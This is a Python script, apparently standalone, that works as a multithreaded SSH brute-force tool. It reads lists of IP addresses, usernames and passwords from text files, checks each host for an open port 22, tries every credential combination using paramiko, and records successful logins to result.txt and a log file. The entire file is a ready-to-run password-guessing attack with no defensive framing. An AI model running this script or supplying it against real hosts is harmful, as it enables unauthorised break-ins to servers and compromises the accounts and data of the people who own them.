import paramiko
import threading
import queue
import socket
import logging

logging.basicConfig(filename='log.txt', level=logging.INFO, format='%(asctime)s:%(levelname)s:%(message)s')

def is_ssh_open(ip):
    logging.info(f'Checking if SSH is open on {ip}')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    try:
        sock.connect((ip, 22))
        sock.close()
        logging.info(f'==================SSH is open on {ip}')
        return True
    except:
        logging.info(f'SSH is not open on {ip}')
        return False

def ssh_login(ip, username, password):
    logging.info(f'Attempting SSH login on {ip} with username {username} and password {password}')
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username=username, password=password)
        logging.info(f'Success: {ip}, {username}, {password}')
        with open('result.txt', 'a') as f:
            f.write(f'Success: {ip}, {username}, {password}\n')
    except:
        logging.info(f'Failed: {ip}, {username}, {password}')
    finally:
        ssh.close()

def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

with open('ipaddress.txt') as f:
    ips = f.read().splitlines()

with open('username.txt') as f:
    usernames = f.read().splitlines()

with open('password.txt') as f:
    passwords = f.read().splitlines()

ips_chunks = list(chunks(ips, 100))

def worker():
    while not q.empty():
        ip, username, password = q.get()
        ssh_login(ip, username, password)
        q.task_done()

for ips in ips_chunks:
    q = queue.Queue()
    valid_ips = [ip for ip in ips if is_ssh_open(ip)]
    for ip in valid_ips:
        for username in usernames:
            for password in passwords:
                q.put((ip, username, password))
    for i in range(5):
        threading.Thread(target=worker).start()
    q.join()
